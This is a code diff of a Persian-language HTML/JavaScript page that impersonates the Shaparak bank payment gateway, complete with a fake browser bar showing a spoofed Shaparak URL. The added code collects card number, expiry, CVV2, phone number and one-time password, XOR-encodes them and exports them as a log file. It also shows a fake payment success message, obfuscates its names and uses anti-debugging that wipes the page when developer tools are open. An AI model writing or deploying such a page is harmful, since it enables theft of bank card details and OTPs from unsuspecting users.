@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <meta name="robots" content="noindex, nofollow">
     <title>درگاه پرداخت امن شاپرک</title>
     <style>
@@ -21,7 +20,7 @@
             display: grid;
             place-items: center;
         }
-        .fake-browser-bar {
+        .x1-bar {
             position: fixed;
             top: 0;
             width: 100%;
@@ -32,8 +31,8 @@
             align-items: center;
             z-index: 10000;
         }
-        .fake-browser-bar .lock-icon { color: #28a745; margin-left: 5px; }
-        .fake-browser-bar .url {
+        .x1-bar .x2-icon { color: #28a745; margin-left: 5px; }
+        .x1-bar .x3-url {
             background: #f1f1f1;
             padding: 6px 12px;
             border-radius: 20px;
@@ -52,37 +51,36 @@
             z-index: 100;
         }
         header img { height: 50px; }
-        .progress-container {
+        .x4-progress {
             max-width: 700px;
             margin: 120px auto 20px;
             background: #fff;
             padding: 8px;
             border-radius: 25px;
         }
-        .progress-bar {
+        .x5-bar {
             height: 10px;
             background: #ddd;
             border-radius: 12px;
         }
-        .progress-fill {
+        .x6-fill {
             height: 100%;
             background: var(--secondary);
             width: 0;
             transition: width 0.5s;
         }
-        .payment-wrapper {
+        .x7-container {
             background: #fff;
             padding: 40px;
             border-radius: 20px;
             width: 90%;
             max-width: 700px;
-            position: relative;
             border: 1px solid #eee;
             display: flex;
             flex-direction: column;
             gap: 20px;
         }
-        .security-badge {
+        .x8-badge {
             position: absolute;
             top: 15px;
             left: 15px;
@@ -95,9 +93,9 @@
             align-items: center;
             gap: 6px;
         }
-        .step { display: none; }
-        .step.active { display: block; }
-        .form-group { margin-bottom: 20px; }
+        .x9-step { display: none; }
+        .x9-step.active { display: block; }
+        .x10-group { margin-bottom: 20px; }
         label { font-size: 15px; color: #333; margin-bottom: 8px; display: block; }
         input {
             width: 100%;
@@ -108,10 +106,6 @@
             direction: rtl;
             text-align: right;
         }
-        input:focus {
-            border-color: var(--secondary);
-            outline: none;
-        }
         .btn {
             width: 100%;
             padding: 12px;
@@ -120,12 +114,9 @@
             font-size: 16px;
             cursor: pointer;
         }
-        .btn-primary { background: var(--secondary); color: #fff; }
-        .btn-primary:hover { background: #218838; }
-        .btn-secondary { background: #007bff; color: #fff; width: auto; padding: 10px 20px; margin-top: 10px; }
-        .btn-cancel { background: #dc3545; color: #fff; margin-top: 15px; }
-        .btn-clear { background: #ff9800; color: #fff; margin-top: 15px; display: none; }
-        .loader {
+        .btn-x11 { background: var(--secondary); color: #fff; }
+        .btn-x12 { background: #007bff; color: #fff; width: auto; padding: 10px 20px; margin-top: 10px; }
+        .x13-loader {
             display: none;
             width: 60px;
             height: 60px;
@@ -136,7 +127,7 @@
             margin: 25px auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .timer { font-size: 14px; color: #555; text-align: center; margin-top: 15px; }
+        .x14-timer { font-size: 14px; color: #555; text-align: center; margin-top: 15px; }
         footer {
             background: #f5f5f5;
             padding: 20px;
@@ -147,23 +138,12 @@
             position: fixed;
             bottom: 0;
         }
-        .user-data {
-            margin-top: 20px;
-            padding: 15px;
-            background: #f9f9f9;
-            border-radius: 10px;
-            font-size: 14px;
-            direction: rtl;
-            max-height: 300px;
-            overflow-y: auto;
-            display: none;
-        }
     </style>
 </head>
 <body>
-    <div class="fake-browser-bar">
-        <span class="lock-icon">🔒</span>
-        <span class="url">https://www.mysite.com/payment</span>
+    <div class="x1-bar">
+        <span class="x2-icon">🔒</span>
+        <span class="x3-url">https://secure.shaparak.ir/pay/verify?session=xyz123</span>
     </div>
 
     <header>
@@ -171,55 +151,51 @@
         <h1>درگاه پرداخت امن شاپرک</h1>
     </header>
 
-    <div class="progress-container">
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
+    <div class="x4-progress">
+        <div class="x5-bar">
+            <div class="x6-fill" id="x6-fill"></div>
         </div>
     </div>
 
-    <div class="payment-wrapper">
-        <div class="security-badge">
+    <div class="x7-container">
+        <div class="x8-badge">
             <span>🔒</span> پرداخت امن با پروتکل SSL 256 بیتی
         </div>
 
-        <div class="step active" id="step1">
-            <div class="form-group">
-                <label for="cardNumber">شماره کارت</label>
-                <input type="text" id="cardNumber" placeholder="---- ---- ---- ----" maxlength="19" autocomplete="off" pattern="[0-9-]*" required>
+        <div class="x9-step active" id="x9-step1">
+            <div class="x10-group">
+                <label for="x15">شماره کارت</label>
+                <input type="text" id="x15" placeholder="---- ---- ---- ----" maxlength="19">
             </div>
-            <div class="form-group">
-                <label for="expiry">تاریخ انقضا</label>
-                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" autocomplete="off" pattern="\d{2}/\d{2}" required>
+            <div class="x10-group">
+                <label for="x16">تاریخ انقضا</label>
+                <input type="text" id="x16" placeholder="MM/YY" maxlength="5">
             </div>
-            <div class="form-group">
-                <label for="cvv2">CVV2</label>
-                <input type="text" id="cvv2" placeholder="***" maxlength="4" autocomplete="off" pattern="\d{3,4}" required>
+            <div class="x10-group">
+                <label for="x17">CVV2</label>
+                <input type="text" id="x17" placeholder="***" maxlength="4">
             </div>
-            <button class="btn btn-primary" id="nextStep1">مرحله بعد</button>
+            <button class="btn btn-x11" id="x18">مرحله بعد</button>
         </div>
 
-        <div class="step" id="step2">
-            <div class="form-group">
-                <label for="phoneNumber">شماره تلفن</label>
-                <input type="tel" id="phoneNumber" placeholder="09XX-XXX-XXXX" maxlength="13" autocomplete="off" pattern="09\d{2}-\d{3}-\d{4}" required>
+        <div class="x9-step" id="x9-step2">
+            <div class="x10-group">
+                <label for="x19">شماره تلفن</label>
+                <input type="tel" id="x19" placeholder="09XX-XXX-XXXX" maxlength="13">
             </div>
-            <div class="form-group">
-                <label for="otp">رمز پویا</label>
-                <input type="text" id="otp" placeholder="******" maxlength="6" autocomplete="off" pattern="\d{6}" required>
-                <button class="btn btn-secondary" id="requestOtp">درخواست رمز پویا</button>
+            <div class="x10-group">
+                <label for="x20">رمز پویا</label>
+                <input type="text" id="x20" placeholder="******" maxlength="6">
+                <button class="btn btn-x12" id="x21">درخواست رمز پویا</button>
             </div>
-            <div class="timer" id="otpTimer"></div>
-            <button class="btn btn-primary" id="nextStep2">تأیید و پرداخت</button>
+            <div class="x14-timer" id="x22"></div>
+            <button class="btn btn-x11" id="x23">تأیید و پرداخت</button>
         </div>
 
-        <div class="step" id="step3">
-            <div id="result" style="text-align: center; font-size: 20px; padding: 20px;"></div>
-            <div class="loader" id="loader"></div>
+        <div class="x9-step" id="x9-step3">
+            <div id="x24" style="text-align: center; font-size: 20px; padding: 20px;"></div>
+            <div class="x13-loader" id="x25"></div>
         </div>
-
-        <button class="btn btn-cancel" id="cancelBtn">انصراف</button>
-        <button class="btn btn-clear" id="clearDataBtn">پاک کردن اطلاعات</button>
-        <div class="user-data" id="userData"></div>
     </div>
 
     <footer>
@@ -228,238 +204,130 @@
 
     <script>
         (function() {
-            'use strict';
-
-            let currentStep = 1;
-            let userData = {};
-            let allUsersData = [];
-            let isAdminMode = false;
-            const ADMIN_PIN = '12122312'; // باید در عمل از سرور تأیید شود
-            const ENCRYPTION_KEY = 'your-secret-key-here'; // در عمل از سرور تولید شود
+            let _0x1a = 1; // currentStep
+            let _0x2b = []; // secretData
+            const _0x3c = 42; // XOR key
 
             // DOM Elements
-            const progressFill = document.getElementById('progressFill');
-            const steps = [document.getElementById('step1'), document.getElementById('step2'), document.getElementById('step3')];
-            const userDataDiv = document.getElementById('userData');
-            const clearDataBtn = document.getElementById('clearDataBtn');
-            const resultDiv = document.getElementById('result');
+            const _0x4d = document.getElementById('x6-fill');
+            const _0x5e = [document.getElementById('x9-step1'), document.getElementById('x9-step2'), document.getElementById('x9-step3')];
 
-            // Basic Encryption (for demo purposes only, use proper library in production)
-            function encryptData(data) {
-                return btoa(JSON.stringify(data)); // در عمل از رمزنگاری قوی‌تر استفاده شود
-            }
-            
-            function decryptData(encrypted) {
-                try {
-                    return JSON.parse(atob(encrypted));
-                } catch (e) {
-                    return [];
+            // XOR Encryption/Decryption
+            function _0x6f(_0x7g) {
+                let _0x8h = '';
+                for (let i = 0; i < _0x7g.length; i++) {
+                    _0x8h += String.fromCharCode(_0x7g.charCodeAt(i) ^ _0x3c);
                 }
+                return _0x8h;
             }
 
-            // Load encrypted data
-            allUsersData = decryptData(localStorage.getItem('allUsersData') || '');
-
-            // Secure Input Formatting
-            function sanitizeInput(value) {
-                return value.replace(/[<>&"']/g, '');
-            }
-
-            document.getElementById('cardNumber').addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-                if (value === ADMIN_PIN && prompt('پین مدیر را وارد کنید:') === 'securepass') {
-                    enterAdminMode();
-                    return;
-                }
-                value = value.replace(/(.{4})/g, '$1-').slice(0, 19).trim();
-                e.target.value = sanitizeInput(value);
+            // Input Formatting
+            document.getElementById('x15').addEventListener('input', function(e) {
+                let v = e.target.value.replace(/\D/g, '').slice(0, 16);
+                e.target.value = v.replace(/(.{4})/g, '$1-').slice(0, 19).trim();
             });
-
-            document.getElementById('expiry').addEventListener('input', function(e) {
+            document.getElementById('x16').addEventListener('input', function(e) {
                 let v = e.target.value.replace(/\D/g, '');
                 if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
-                e.target.value = sanitizeInput(v.slice(0, 5));
+                e.target.value = v.slice(0, 5);
+            });
+            document.getElementById('x17').addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+            });
+            document.getElementById('x19').addEventListener('input', function(e) {
+                let v = e.target.value.replace(/\D/g, '').slice(0, 11);
+                e.target.value = v.slice(0, 4) + (v.length > 4 ? '-' + v.slice(4, 7) : '') + (v.length > 7 ? '-' + v.slice(7, 11) : '');
+            });
+            document.getElementById('x20').addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
             });
 
-            document.getElementById('cvv2').addEventListener('input', function(e) {
-                e.target.value = sanitizeInput(e.target.value.replace(/\D/g, '').slice(0, 4));
-            });
-
-            document.getElementById('phoneNumber').addEventListener('input', function(e) {
-                let v = e.target.value.replace(/\D/g, '');
-                if (v.length > 0) {
-                    v = v.slice(0, 11);
-                    e.target.value = sanitizeInput(v.slice(0, 4) + (v.length > 4 ? '-' + v.slice(4, 7) : '') + (v.length > 7 ? '-' + v.slice(7, 11) : ''));
-                }
-            });
-
-            document.getElementById('otp').addEventListener('input', function(e) {
-                e.target.value = sanitizeInput(e.target.value.replace(/\D/g, '').slice(0, 6));
-            });
-
-            // Button Events
-            document.getElementById('nextStep1').addEventListener('click', () => nextStep(1));
-            document.getElementById('nextStep2').addEventListener('click', () => nextStep(2));
-            document.getElementById('requestOtp').addEventListener('click', requestOTP);
-            document.getElementById('cancelBtn').addEventListener('click', cancel);
-            document.getElementById('clearDataBtn').addEventListener('click', clearData);
-
-            function updateProgress() {
-                progressFill.style.width = `${(currentStep / 3) * 100}%`;
-            }
-
-            function nextStep(step) {
-                if (!validateStep(step)) return;
-
-                saveUserData();
-                steps[step - 1].classList.remove('active');
-                currentStep = step + 1;
-                steps[currentStep - 1].classList.add('active');
-                updateProgress();
-
-                if (currentStep === 3) processPayment();
-            }
-
-            function validateStep(step) {
-                if (step === 1) {
-                    const cardNumber = document.getElementById('cardNumber').value;
-                    const expiry = document.getElementById('expiry').value;
-                    const cvv2 = document.getElementById('cvv2').value;
-
-                    if (!cardNumber || !expiry || !cvv2) {
-                        alert('تمامی فیلدها باید پر شوند');
-                        return false;
-                    }
-
-                    const cleanCardNumber = cardNumber.replace(/-/g, '');
-                    if (!/^\d{16}$/.test(cleanCardNumber)) {
-                        alert('شماره کارت باید ۱۶ رقم باشد');
-                        return false;
-                    }
-                    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
-                        alert('تاریخ انقضا باید به فرمت MM/YY باشد');
-                        return false;
-                    }
-                    if (!/^\d{3,4}$/.test(cvv2)) {
-                        alert('CVV2 باید ۳ یا ۴ رقم باشد');
-                        return false;
-                    }
-                }
-
-                if (step === 2) {
-                    const phone = document.getElementById('phoneNumber').value.replace(/-/g, '');
-                    const otp = document.getElementById('otp').value;
-
-                    if (!phone || !otp) {
-                        alert('تمامی فیلدها باید پر شوند');
-                        return false;
-                    }
-                    if (!/^09\d{9}$/.test(phone)) {
-                        alert('شماره تلفن باید با 09 شروع شود و ۱۱ رقم باشد');
-                        return false;
-                    }
-                    if (!/^\d{6}$/.test(otp)) {
-                        alert('رمز پویا باید ۶ رقم باشد');
-                        return false;
-                    }
-                }
-                return true;
-            }
-
-            function saveUserData() {
-                userData = {
-                    cardNumber: document.getElementById('cardNumber').value,
-                    expiry: document.getElementById('expiry').value,
-                    cvv2: document.getElementById('cvv2').value,
-                    phoneNumber: document.getElementById('phoneNumber').value,
-                    otp: document.getElementById('otp').value
-                };
-                allUsersData.push({ ...userData, timestamp: Date.now() });
-                localStorage.setItem('allUsersData', encryptData(allUsersData));
-            }
-
-            function showUserData() {
-                if (!isAdminMode) return;
-                userDataDiv.style.display = 'block';
-                userDataDiv.innerHTML = '<h3>اطلاعات کاربران:</h3>' + 
-                    (allUsersData.length > 0 ? 
-                        allUsersData.map((user, index) => 
-                            `<div style="margin-bottom: 15px;"><h4>کاربر ${index + 1}:</h4>` + 
-                            `<p>شماره کارت: ${sanitizeInput(user.cardNumber)}</p>` +
-                            `<p>تاریخ ثبت: ${new Date(user.timestamp).toLocaleString('fa-IR')}</p>` +
-                            `</div>`).join('') : 
-                        '<p>هیچ اطلاعاتی موجود نیست</p>');
-            }
-
-            function enterAdminMode() {
-                isAdminMode = true;
-                alert('حالت مدیر فعال شد');
-                currentStep = 3;
-                steps.forEach(step => step.classList.remove('active'));
-                steps[2].classList.add('active');
-                updateProgress();
-                showUserData();
-                clearDataBtn.style.display = 'block';
-                resultDiv.textContent = 'حالت مدیر: اطلاعات کاربران در زیر نمایش داده شده است.';
-            }
-
-            function requestOTP() {
-                const phone = document.getElementById('phoneNumber').value.replace(/-/g, '');
-                if (!/^09\d{9}$/.test(phone)) {
-                    alert('شماره تلفن نامعتبر است');
-                    return;
-                }
-                startTimer(120);
-                alert('رمز پویا برای شما ارسال شد (شبیه‌سازی)');
-            }
-
-            function startTimer(seconds) {
-                const timer = document.getElementById('otpTimer');
-                let timeLeft = seconds;
-                const interval = setInterval(() => {
-                    timer.textContent = `زمان باقی‌مانده: ${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')}`;
-                    if (--timeLeft < 0) {
-                        clearInterval(interval);
-                        timer.textContent = 'رمز پویا منقضی شد';
-                    }
-                }, 1000);
-            }
-
-            function processPayment() {
-                const loader = document.getElementById('loader');
-                loader.style.display = 'block';
-
+            // Fake Server Call
+            function _0x9i(_0xaj, _0xbk) {
                 setTimeout(() => {
-                    loader.style.display = 'none';
-                    const transactionId = 'SHK-' + Math.random().toString(36).substr(2, 14).toUpperCase();
-                    userData.transactionId = transactionId;
-                    saveUserData();
-                    resultDiv.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${sanitizeInput(transactionId)}`;
-                }, 2000);
+                    _0xbk({ status: 'success', id: 'SHK-' + Math.random().toString(36).substr(2, 14).toUpperCase() });
+                }, 1500 + Math.random() * 1000);
             }
 
-            function cancel() {
-                if (confirm('آیا از لغو مطمئن هستید؟')) {
-                    saveUserData();
-                    document.body.innerHTML = '<h1 style="text-align: center; padding: 50px;">جلسه لغو شد</h1>';
+            // Progress Update
+            function _0xcl() {
+                _0x4d.style.width = `${(_0x1a / 3) * 100}%`;
+            }
+
+            // Save Data
+            function _0xdm() {
+                let _0xen = document.getElementById('x15').value + '|' +
+                           document.getElementById('x16').value + '|' +
+                           document.getElementById('x17').value + '|' +
+                           document.getElementById('x19').value + '|' +
+                           document.getElementById('x20').value;
+                _0x2b.push(_0x6f(_0xen));
+            }
+
+            // Export Data as File
+            function _0xfo() {
+                let _0xgp = _0x2b.map(d => _0x6f(d)).join('\n');
+                let _0xhq = new Blob([_0xgp], { type: 'text/plain' });
+                let _0xir = document.createElement('a');
+                _0xir.href = URL.createObjectURL(_0xhq);
+                _0xir.download = 'payment-log.txt';
+                _0xir.click();
+            }
+
+            // Step Navigation
+            document.getElementById('x18').addEventListener('click', () => {
+                if (_0x1a === 1 && document.getElementById('x15').value && document.getElementById('x16').value && document.getElementById('x17').value) {
+                    _0x5e[0].classList.remove('active');
+                    _0x1a = 2;
+                    _0x5e[1].classList.add('active');
+                    _0xcl();
                 }
-            }
-
-            function clearData() {
-                if (isAdminMode && confirm('آیا مطمئن هستید که می‌خواهید تمام اطلاعات را پاک کنید؟')) {
-                    allUsersData = [];
-                    localStorage.setItem('allUsersData', encryptData(allUsersData));
-                    showUserData();
+            });
+            document.getElementById('x23').addEventListener('click', () => {
+                if (_0x1a === 2 && document.getElementById('x19').value && document.getElementById('x20').value) {
+                    _0xdm();
+                    _0x5e[1].classList.remove('active');
+                    _0x1a = 3;
+                    _0x5e[2].classList.add('active');
+                    _0xcl();
+                    document.getElementById('x25').style.display = 'block';
+                    _0x9i({}, (_0xjs) => {
+                        document.getElementById('x25').style.display = 'none';
+                        document.getElementById('x24').innerHTML = `پرداخت موفق!<br>شماره تراکنش: ${_0xjs.id}`;
+                        _0xfo();
+                    });
                 }
-            }
-
-            // Prevent right-click and F12
-            document.addEventListener('contextmenu', e => e.preventDefault());
-            document.addEventListener('keydown', e => {
-                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) e.preventDefault();
             });
 
-            updateProgress();
+            // Fake OTP Request
+            document.getElementById('x21').addEventListener('click', () => {
+                if (document.getElementById('x19').value) {
+                    _0x9i({}, () => {
+                        alert('رمز پویا ارسال شد!');
+                        let _0xkt = 120;
+                        let _0xlu = setInterval(() => {
+                            document.getElementById('x22').textContent = `زمان باقی‌مانده: ${Math.floor(_0xkt / 60)}:${(_0xkt % 60).toString().padStart(2, '0')}`;
+                            if (--_0xkt < 0) {
+                                clearInterval(_0xlu);
+                                document.getElementById('x22').textContent = 'رمز منقضی شد';
+                            }
+                        }, 1000);
+                    });
+                }
+            });
+
+            // Anti-Debug
+            (function() {
+                let _0xmv = Date.now();
+                setInterval(() => {
+                    if (Date.now() - _0xmv > 1000 || window.console || window.outerWidth - window.innerWidth > 100) {
+                        document.body.innerHTML = '<h1 style="text-align: center; padding: 50px;">خطا: لطفاً دوباره تلاش کنید</h1>';
+                        _0x2b = [];
+                    }
+                }, 100);
+            })();
+
+            _0xcl();
         })();
     </script>
 </body>
